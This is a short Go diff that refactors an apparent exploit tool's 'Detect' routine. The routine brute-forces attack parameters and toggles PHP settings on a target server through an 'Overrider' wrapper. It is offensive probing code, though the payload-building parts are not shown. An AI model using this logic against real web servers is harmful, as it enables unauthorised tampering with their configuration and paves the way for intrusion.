@@ -84,16 +84,16 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onl
 		}
 	}
 
-	payload, err := MakePathInfo(method.PHPOptionEnable)
-	if err != nil {
-		// methods are hardcoded, this shouldn't happen
-		panic(err)
-	}
 	for try := 0; try < SettingEnableRetries; try += 1 {
 		for _, qsl := range qslCandidates {
 			for _, pl := range plCandidates {
 				params := &AttackParams{qsl, pl}
-				resp, data, err := requester.Request(payload, params)
+				overrider := &Overrider{
+					Requester: requester,
+					Params:    params,
+				}
+				setting := method.PHPOptionEnable
+				resp, data, err := overrider.PHPValue(setting, "")
 				if err != nil {
 					return nil, fmt.Errorf("error for %#v: %v", params, err)
 				}
@@ -103,7 +103,7 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onl
 
 				if method.Check(resp, data) {
 					log.Printf("Attack params found: %v", params)
-					return params, SetSetting(requester, params, method.PHPOptionDisable, SettingEnableRetries)
+					return params, overrider.PHPValueWithRetries(method.PHPOptionDisable, SettingEnableRetries)
 				}
 			}
 		}
